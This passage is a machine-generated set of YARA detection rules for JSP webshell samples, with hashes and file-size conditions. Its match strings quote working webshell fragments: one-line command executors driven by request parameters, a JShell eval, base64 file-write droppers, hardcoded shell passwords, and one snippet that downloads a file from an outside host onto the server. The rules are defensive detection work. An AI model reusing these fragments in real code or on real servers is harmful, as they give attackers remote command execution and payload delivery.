      $s6 = "<%@ page import=\"java.io.*\" %>" fullword ascii
      $s7 = "<INPUT type=submit value='Run'>" fullword ascii
      $s8 = "         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));" fullword ascii
      $s9 = "   if(cmd != null) {" fullword ascii
      $s10 = "<%=output %>" fullword ascii
      $s11 = "         while((s = sI.readLine()) != null) {" fullword ascii
   condition:
      uint16(0) == 0x2f2f and filesize < 1KB and
      1 of ($x*) and all of them
}

rule webshell_jsp_ma__1_ {
   meta:
      description = "webshell - file ma (1).jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "79b827d25ac28bec5256f09dcfebfcd66960e6953a0d6157a9413f980e6ff38f"
   strings:
      $s1 = "String Pwd=\"lincx\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule JspSpyJDK51 {
   meta:
      description = "webshell - file JspSpyJDK51.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
   strings:
      $s1 = "private static final String PW = \"ninty\"; //password" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 200KB and
      all of them
}

rule luci_jsp_spy2009 {
   meta:
      description = "webshell - file luci.jsp.spy2009.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
   strings:
      $s1 = "private static final String PW = \"lucifer\"; //password" fullword ascii
      $s2 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//??????" fullword ascii
      $s3 = "\"IP : <input name=\\\"ip\\\" type=\\\"text\\\" value=\\\"\"+ip+\"\\\" id=\\\"ip\\\" class=\\\"input\\\" style=\\\"width:10%;mar" ascii
      $s4 = ";\\\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
      $s5 = "??? : <input name=\\\"timeout\\\" type=\\\"text\\\" value=\\\"\"+timeout+\"\\\" id=\\\"timeout\\\" class=\\\"input\\\" size=\\\"" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      all of them
}

rule webshell_jsp_k81 {
   meta:
      description = "webshell - file k81.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9305e2ba9d9fe2b4dfe9a1d34df28d14a54cc2705d326fbb25f5450bc863934f"
   strings:
      $x1 = "Process child = Runtime.getRuntime().exec(k8cmd);" fullword ascii
      $s2 = "String cmd = request.getParameter(\"k8\");" fullword ascii
      $s3 = "System.err.println(e);" fullword ascii
      $s4 = "while ((c = in.read()) != -1) {" fullword ascii
      $s5 = "InputStream in = child.getInputStream();" fullword ascii
      $s6 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword ascii
      $s7 = "String dir=new File(path).getParent();" fullword ascii
      $s8 = "<%@page import=\"sun.misc.BASE64Decoder\"%>" fullword ascii
      $s9 = "child.waitFor();" fullword ascii
      $s10 = "out.print((char)c);" fullword ascii
      $s11 = "String k8cmd = new String(binary);" fullword ascii
      $s12 = "out.print(\"|<-\");" fullword ascii
      $s13 = "out.print(\"->|\");" fullword ascii
      $s14 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword ascii
      $s15 = "String path=application.getRealPath(request.getRequestURI());" fullword ascii
      $s16 = "} catch (IOException e) {" fullword ascii
      $s17 = "} catch (InterruptedException e) {" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_yijuhua {
   meta:
      description = "webshell - file yijuhua.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f4a0353cab22847ddfe6a2f875cb941e5e4dd78c3eadc33d0bc9f2a38bccf606"
   strings:
      $s1 = "Process p = Runtime.getRuntime().exec(c);" fullword ascii
      $s2 = "ResultSet r = m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);" fullword ascii
      $s3 = "ResultSet r = m.executeQuery(\"select * from \" + x[x.length-1]);" fullword ascii
      $s4 = "sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
      $s5 = "m.executeUpdate(q);" fullword ascii
      $s6 = "xOf(\"--f:\") + 4,q.length()).trim()),true),cs));" fullword ascii
      $s7 = "bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(\"-to:\")!=-1?p.trim():p+q.substring(q.in" ascii
      $s8 = "os.write((\"->\" + \"|\").getBytes(), 0, 3);" fullword ascii
      $s9 = "sb.append(r.getObject(i)+\"\" + \"\\t|\\t\");" fullword ascii
      $s10 = "String z2 = EC(request.getParameter(\"z2\") + \"\");" fullword ascii
      $s11 = "String z1 = EC(request.getParameter(\"z1\") + \"\");" fullword ascii
      $s12 = "cs = request.getParameter(\"z0\") != null ? request.getParameter(\"z0\")+ \"\":cs;" fullword ascii
      $s13 = "os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));" fullword ascii
      $s14 = "sb.append(d.getColumnName(i) + \"\\t|\\t\");" fullword ascii
      $s15 = "sb.append(r.getString(1) + \"\\t\");" fullword ascii
      $s16 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ + \"\\n\");" fullword ascii
      $s17 = "sF+=l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"+ sQ + \"\\n\";" fullword ascii
      $s18 = "os.write((\"|\" + \"<-\").getBytes(), 0, 3);" fullword ascii
      $s19 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)+ \")\\t\");" fullword ascii
      $s20 = "String Z = EC(request.getParameter(Pwd) + \"\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule jsp {
   meta:
      description = "webshell - file jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6b4e479af8f1890e3d56bdf85186f380ba971d4ddc2ca261d076597f290e1456"
   strings:
      $s1 = "Process p = Runtime.getRuntime().exec(c);" fullword ascii
      $s2 = "ResultSet r = m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);" fullword ascii
      $s3 = "ResultSet r = m.executeQuery(\"select * from \" + x[x.length-1]);" fullword ascii
      $s4 = "sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
      $s5 = "m.executeUpdate(q);" fullword ascii
      $s6 = "xOf(\"--f:\") + 4,q.length()).trim()),true),cs));" fullword ascii
      $s7 = "bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(\"-to:\")!=-1?p.trim():p+q.substring(q.in" ascii
      $s8 = "os.write((\"->\" + \"|\").getBytes(), 0, 3);" fullword ascii
      $s9 = "sb.append(r.getObject(i)+\"\" + \"\\t|\\t\");" fullword ascii
      $s10 = "String z2 = EC(request.getParameter(\"z2\") + \"\");" fullword ascii
      $s11 = "String z1 = EC(request.getParameter(\"z1\") + \"\");" fullword ascii
      $s12 = "cs = request.getParameter(\"z0\") != null ? request.getParameter(\"z0\")+ \"\":cs;" fullword ascii
      $s13 = "os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));" fullword ascii
      $s14 = "sb.append(d.getColumnName(i) + \"\\t|\\t\");" fullword ascii
      $s15 = "sb.append(r.getString(1) + \"\\t\");" fullword ascii
      $s16 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ + \"\\n\");" fullword ascii
      $s17 = "sF+=l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"+ sQ + \"\\n\";" fullword ascii
      $s18 = "os.write((\"|\" + \"<-\").getBytes(), 0, 3);" fullword ascii
      $s19 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)+ \")\\t\");" fullword ascii
      $s20 = "String Z = EC(request.getParameter(Pwd) + \"\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule webshell_jsp_utils {
   meta:
      description = "webshell - file utils.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4bfe0d96c929ca04283f61b88dc2382fa4f5f6ea5735f0c3d3900c590e98bda6"
   strings:
      $s1 = "Process p = Runtime.getRuntime().exec(c);" fullword ascii
      $s2 = "ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
      $s3 = "sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
      $s4 = "m.executeUpdate(q);" fullword ascii
      $s5 = "ResultSet r = m.executeQuery(q);" fullword ascii
      $s6 = "response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
      $s7 = "Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
      $s8 = "os.write((\"->\" + \"|\").getBytes(), 0, 3);" fullword ascii
      $s9 = "sb.append(d.getColumnName(i) + \"\\t|\\t\");" fullword ascii
      $s10 = "sb.append(r.getString(1) + \"\\t\");" fullword ascii
      $s11 = "os.write((\"|\" + \"<-\").getBytes(), 0, 3);" fullword ascii
      $s12 = "HH(s + \"/\" + z[j].getName(), d + \"/\" + z[j].getName());" fullword ascii
      $s13 = "sb.append(r.getString(\"TABLE_NAME\") + \"\\t\");" fullword ascii
      $s14 = "String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
      $s15 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
      $s16 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";" fullword ascii
      $s17 = "String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
      $s18 = "String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
      $s19 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
      $s20 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule webshell_jsp_jdbc {
   meta:
      description = "webshell - file jdbc.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c8ef23e6759e2dd84f28fc1ec5ae913b35c8efb05dd6aa2951aed9fe867553a1"
   strings:
      $s1 = "Process p = Runtime.getRuntime().exec(c);" fullword ascii
      $s2 = "ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
      $s3 = "sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
      $s4 = "m.executeUpdate(q);" fullword ascii
      $s5 = "ResultSet r = m.executeQuery(q);" fullword ascii
      $s6 = "response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
      $s7 = "Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
      $s8 = "os.write((\"->\" + \"|\").getBytes(), 0, 3);" fullword ascii
      $s9 = "sb.append(d.getColumnName(i) + \"\\t|\\t\");" fullword ascii
      $s10 = "sb.append(r.getString(1) + \"\\t\");" fullword ascii
      $s11 = "os.write((\"|\" + \"<-\").getBytes(), 0, 3);" fullword ascii
      $s12 = "HH(s + \"/\" + z[j].getName(), d + \"/\" + z[j].getName());" fullword ascii
      $s13 = "sb.append(r.getString(\"TABLE_NAME\") + \"\\t\");" fullword ascii
      $s14 = "String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
      $s15 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
      $s16 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";" fullword ascii
      $s17 = "String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
      $s18 = "String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
      $s19 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
      $s20 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule webshell_jsp_jsp {
   meta:
      description = "webshell - file jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "322807a2af30c73616c67862e736796f59efe1508ee0fe6ddb1e04f10ef72c06"
   strings:
      $s1 = "Process p = Runtime.getRuntime().exec(c);" fullword ascii
      $s2 = "ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
      $s3 = "sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
      $s4 = "m.executeUpdate(q);" fullword ascii
      $s5 = "ResultSet r = m.executeQuery(q);" fullword ascii
      $s6 = "System.out.println(request.getMethod());" fullword ascii
      $s7 = "response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
      $s8 = "Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
      $s9 = "os.write((\"->\" + \"|\").getBytes(), 0, 3);" fullword ascii
      $s10 = "os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));" fullword ascii
      $s11 = "sb.append(d.getColumnName(i) + \"\\t|\\t\");" fullword ascii
      $s12 = "sb.append(r.getString(1) + \"\\t\");" fullword ascii
      $s13 = "os.write((\"|\" + \"<-\").getBytes(), 0, 3);" fullword ascii
      $s14 = "HH(s + \"/\" + z[j].getName(), d + \"/\" + z[j].getName());" fullword ascii
      $s15 = "sb.append(r.getString(\"TABLE_NAME\") + \"\\t\");" fullword ascii
      $s16 = "String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
      $s17 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
      $s18 = "String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
      $s19 = "String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
      $s20 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule JSP {
   meta:
      description = "webshell - file JSP.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "565c4c6aafcd1e1d4a98db793e8122302713c5944efbf96f56a861399746400b"
   strings:
      $s1 = "String Pwd=\"sky\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      all of them
}

rule webshell_jsp_guige {
   meta:
      description = "webshell - file guige.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8f0a0afc3b62d0834ef1bc2c80bce400c9f351117f1d89d8827bb567a4362803"
   strings:
      $s1 = "String content=request.getParameter(\"content\");" fullword ascii
      $s2 = "out.println(\"<form action=\"+url+\" method=post>\");" fullword ascii
      $s3 = "out.println(\"<textarea name=content rows=10 cols=50></textarea><br>\");" fullword ascii
      $s4 = "pw.println(content);//" fullword ascii
      $s5 = "String url1=request.getRealPath(request.getServletPath());//" fullword ascii
      $s6 = "String url=request.getRequestURI();//" fullword ascii
      $s7 = "String damapath=request.getParameter(\"path\");" fullword ascii
      $s8 = "String dir=new File(url1).getParent(); //" fullword ascii
      $s9 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null&&!content.equals(\"\"))" fullword ascii
      $s10 = "<%@ page contentType=\"text/html;charset=UTF-8\"%>" fullword ascii
      $s11 = "out.println(\"</form>\");" fullword ascii
      $s12 = "out.println(\"<font size=2 color=red>" fullword ascii
      $s13 = "4:</font><input type=text size=45 name=path value=\"+dir+\"/m.jsp><br>\");" fullword ascii
      $s14 = "out.println(\"<input type=submit value=save>\");" fullword ascii
      $s15 = "out.println(\"<font size=2>" fullword ascii
      $s16 = "<body bgcolor=\"#ffffff\">" fullword ascii
      $s17 = "2damafile" fullword ascii
      $s18 = "content," fullword ascii /* Goodware String - occured 1 times */
      $s19 = "File damafile=new File(damapath);//" fullword ascii
      $s20 = "pw.close();//" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 7KB and
      8 of them
}

rule webshell_jsp_cmd1 {
   meta:
      description = "webshell - file cmd1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "59df3f36552613625ce2fbc362e9c4e101a47cbe0d5bbd9601c9e12705282998"
   strings:
      $s1 = "<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_jsp_w02 {
   meta:
      description = "webshell - file w02.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2c34c33e58591204dace846a2efca98e829d55108269877a147c4db58e2594bd"
   strings:
      $s1 = "codeBuffer(request.getParameter(\"c\")));out.close();%> " fullword ascii
      $s2 = "<%new java.io.FileOutputStream(application.getRealPath(\"/\")+\"/\"+request.getParameter(\"f\")).write(new sun.misc.BASE64Decode" ascii
      $s3 = "<%new java.io.FileOutputStream(application.getRealPath(\"/\")+\"/\"+request.getParameter(\"f\")).write(new sun.misc.BASE64Decode" ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_jsp_zx {
   meta:
      description = "webshell - file zx.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dbaa31e2207418889299b04adf1e4b1aa2340b30d165f1afe2eb1f21557249df"
   strings:
      $s1 = "(request.getParameter(\"t\").getBytes());" fullword ascii
      $s2 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\\\")+request.getParameter(\"f\")" ascii
      $s3 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\\\")+request.getParameter(\"f\")" ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_jsp_IXRbE02 {
   meta:
      description = "webshell - file IXRbE02.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "26654c4213cbaff5769618c96be371610ea48ff3f85e909786b9218063e95214"
   strings:
      $s1 = "e(request.getParameter(\"t\").getBytes());%>xIXRbE.jspx" fullword ascii
      $s2 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\"))" ascii
      $s3 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\"))" ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_jsp_ver007 {
   meta:
      description = "webshell - file ver007.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "21fc92b2d8e6c439a04cb584d0b33c49e6c9460d754429795f3c7de68777772c"
   strings:
      $s1 = "e(request.getParameter(\"t\").getBytes());%>" fullword ascii
      $s2 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\"))" ascii
      $s3 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"/\")+request.getParameter(\"f\"))" ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_jsp_hsxa1 {
   meta:
      description = "webshell - file hsxa1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "68382b7569ad669bf98a8ee26ecb95c098b5a7692994fef5c9d22b77ed68b069"
   strings:
      $s1 = "utStream\"/><jsp:directive.page import=\"java.io.FileOutputStream\"/><% int i=0;String method=request.getParameter(\"act\");if(m" ascii
      $s2 = "!=null&&method.equals(\"yoco\")){String url=request.getParameter(\"url\");String text=request.getParameter(\"smart\");File f=new" ascii
      $s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"java.io.File\"/><jsp:directive.page import=\"java." ascii
      $s4 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"java.io.File\"/><jsp:directive.page import=\"java." ascii
      $s5 = "url);if(f.exists()){f.delete();}try{OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();}catch(Exception e" ascii
      $s6 = "){i++;%>0<%}}if(i==0){%>1<%}%><form action='?act=yoco' method='post'><input size=\"100\" value=\"<%=application.getRealPath(\"/" ascii
      $s7 = "\" name=\"url\"><br><textarea rows=\"20\" cols=\"80\" name=\"smart\">" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 2KB and
      all of them
}

rule webshell_jsp_hsxa {
   meta:
      description = "webshell - file hsxa.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d77f3332083ca55d0cc730c39970b6413430e986c6adae9ece72cceb640da27b"
   strings:
      $s1 = "utStream\"/><jsp:directive.page import=\"java.io.FileOutputStream\"/><% int i=0;String method=request.getParameter(\"act\");if(m" ascii
      $s2 = "!=null&&method.equals(\"yoco\")){String url=request.getParameter(\"url\");String text=request.getParameter(\"smart\");File f=new" ascii
      $s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"java.io.File\"/><jsp:directive.page import=\"java." ascii
      $s4 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"java.io.File\"/><jsp:directive.page import=\"java." ascii
      $s5 = "url);if(f.exists()){f.delete();}try{OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();}catch(Exception e" ascii
      $s6 = "){i++;%>0<%}}if(i==0){%>1<%}%><form action='?act=yoco' method='post'><input size=\"100\" value=\"<%=application.getRealPath(\"/" ascii
      $s7 = "\" name=\"url\"><br><textarea rows=\"20\" cols=\"80\" name=\"smart\">" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 2KB and
      all of them
}

rule Java_Shell {
   meta:
      description = "webshell - file Java Shell.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e51a2ac2c8026a4a860fe29e0d84e8e258bc2a8516e464860890caf3b3a291a2"
   strings:
      $s1 = "interp.exec(command);" fullword ascii
      $s2 = "command += space + line + \"\\n\";" fullword ascii
      $s3 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword ascii
      $s4 = "frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);" fullword ascii
      $s5 = "console.run();" fullword ascii
      $s6 = "frame.add(console, BorderLayout.CENTER);" fullword ascii
      $s7 = "this(null, Py.getSystemState());" fullword ascii
      $s8 = "private Color colorError = new Color(187, 0, 0);" fullword ascii
      $s9 = "public JythonShell(PyObject dict, PySystemState systemState, int columns, int rows, int scrollback) {" fullword ascii
      $s10 = "this(dict, Py.getSystemState());" fullword ascii
      $s11 = "command = \"\";" fullword ascii
      $s12 = "this(null, Py.getSystemState(), columns, rows, scrollback);" fullword ascii
      $s13 = "public JythonShell() {" fullword ascii
      $s14 = "public JythonShell(PyObject dict, PySystemState systemState) {" fullword ascii
      $s15 = "public JythonShell(PyObject dict) {" fullword ascii
      $s16 = "String command = \"\";" fullword ascii
      $s17 = "public JythonShell(int columns, int rows, int scrollback) {" fullword ascii
      $s18 = "public void run() {" fullword ascii
      $s19 = "console.setTextAttributes(new TextAttributes(colorError));" fullword ascii
      $s20 = "import java.awt.*;" fullword ascii
   condition:
      uint16(0) == 0x6170 and filesize < 8KB and
      8 of them
}

rule webshell_jsp_a {
   meta:
      description = "webshell - file a.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
   strings:
      $s1 = "private static final String PW = \"mr.wei\"; //password" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      all of them
}

rule webshell_jsp_u {
   meta:
      description = "webshell - file u.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
   strings:
      $s1 = "private static final String PW = \"592714\"; //password" fullword ascii
      $s2 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//?????????" fullword ascii
      $s3 = "\"IP : <input name=\\\"ip\\\" type=\\\"text\\\" value=\\\"\"+ip+\"\\\" id=\\\"ip\\\" class=\\\"input\\\" style=\\\"width:10%;mar" ascii
      $s4 = "8px;\\\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
      $s5 = "?????? : <input name=\\\"timeout\\\" type=\\\"text\\\" value=\\\"\"+timeout+\"\\\" id=\\\"timeout\\\" class=\\\"input\\\" size=" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      all of them
}

rule webshell_jsp_css {
   meta:
      description = "webshell - file css.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
   strings:
      $s1 = "private static final String PW = \"xo\"; //password" fullword ascii
      $s2 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//????????????" fullword ascii
      $s3 = "\"IP : <input name=\\\"ip\\\" type=\\\"text\\\" value=\\\"\"+ip+\"\\\" id=\\\"ip\\\" class=\\\"input\\\" style=\\\"width:10%;mar" ascii
      $s4 = "8px;\\\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
      $s5 = "?????? : <input name=\\\"timeout\\\" type=\\\"text\\\" value=\\\"\"+timeout+\"\\\" id=\\\"timeout\\\" class=\\\"input\\\" size=" ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      all of them
}

rule webshell_jsp_cmd2 {
   meta:
      description = "webshell - file cmd2.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5b3c6b4d7423cefb536cb3361d6f77686baebe90e43278e0f2145fb5e0bbd642"
   strings:
      $s1 = "        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();" fullword ascii
      $s2 = "    if(\"023\".equals(request.getParameter(\"pwd\"))){" fullword ascii
      $s3 = "        while((a=in.read(b))!=-1){" fullword ascii
      $s4 = "        int a = -1;" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_jsp_jshell {
   meta:
      description = "webshell - file jshell.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "90c60bbc8c058d5f7ff7b25037eb9591225cbe703b6f89c998bcc054c4c616f7"
   strings:
      $s1 = "<%=jdk.jshell.JShell.builder().build().eval(request.getParameter(\"src\"))%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_jsp_web02 {
   meta:
      description = "webshell - file web02.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "425fe29b9c497a1ea8c67cd9fe06cdf257efdeb73a2ebcd091039a2ff92434cd"
   strings:
      $s1 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request.getRealPath(\"/\")+request.getParameter(\"f\");n" ascii
      $s2 = "RL(\"http://qztmi.cn/js/h.txt\").openConnection())).getInputStream());DataOutputStream o=new DataOutputStream(new FileOutputStre" ascii
      $s3 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request.getRealPath(\"/\")+request.getParameter(\"f\");n" ascii
      $s4 = "t).getParentFile().mkdirs();if(request.getParameter(\"p\")==null){DataInputStream i=new DataInputStream(((HttpURLConnection)(new" ascii
      $s5 = "setHeader(\"down-ok\",\"1\");}else{(new FileOutputStream(t)).write(request.getParameter(\"p\").getBytes());out.println(\"upload-" ascii
      $s6 = "(t));byte[] b=new byte[4096];int c=0;while((c=i.read(b))>0){o.write(b,0,c);}o.close();i.close();out.println(\"down-ok\");respons" ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule ROOTtows {
   meta:
      description = "webshell - file ROOTtows.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
